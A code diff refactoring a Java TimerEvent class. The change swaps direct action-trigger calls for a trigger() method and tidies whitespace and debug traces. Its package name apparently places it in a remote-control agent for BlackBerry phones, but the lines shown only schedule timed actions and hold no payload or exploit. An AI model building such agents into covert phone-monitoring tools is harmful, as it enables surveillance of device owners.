@@ -20,7 +20,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class TimerEvent extends Event {
     private static final int SLEEP_TIME = 1000;
 
-	//#debug
+    //#debug
     private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);
 
     int type;
@@ -34,7 +34,7 @@ public class TimerEvent extends Event {
     }
 
     public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
-        super(Event.EVENT_TIMER, actionId_);
+        super(Event.EVENT_TIMER, actionId_, "TimerEvent");
         this.type = type_;
         this.loDelay = loDelay_;
         this.hiDelay = hiDelay_;
@@ -42,7 +42,7 @@ public class TimerEvent extends Event {
 
     protected void actualRun() {
         // #debug
-        debug.trace("EventRun");
+        debug.trace("actualRun");
         // #ifdef DBC
         Check.requires(statusObj != null, "StatusObj NULL");
         // #endif
@@ -60,10 +60,8 @@ public class TimerEvent extends Event {
                 if (now.getTime() - timestamp.getTime() > wait) {
                     // #debug
                     debug.trace("TIMER_SINGLE");
-                    // #debug
-                    debug.trace("triggering:" + actionId);
-                    statusObj.triggerAction(actionId);
-                  //#debug
+                    trigger();
+                    //#debug
                     debug.trace("stopping timer single");
                     stop();
                     return;
@@ -78,7 +76,7 @@ public class TimerEvent extends Event {
                     // #debug
                     debug.trace("TIMER_REPEAT");
                     timestamp = now;
-                    statusObj.triggerAction(actionId);
+                    trigger();
                 }
                 break;
             case Conf.CONF_TIMER_DATE:
@@ -95,8 +93,8 @@ public class TimerEvent extends Event {
                 if (now.getTime() > tmpTime) {
                     // #debug
                     debug.trace("TIMER_DATE");
-                    statusObj.triggerAction(actionId);
-                  //#debug
+                    trigger();
+                    //#debug
                     debug.trace("stopping timer date");
                     stop();
                     return;
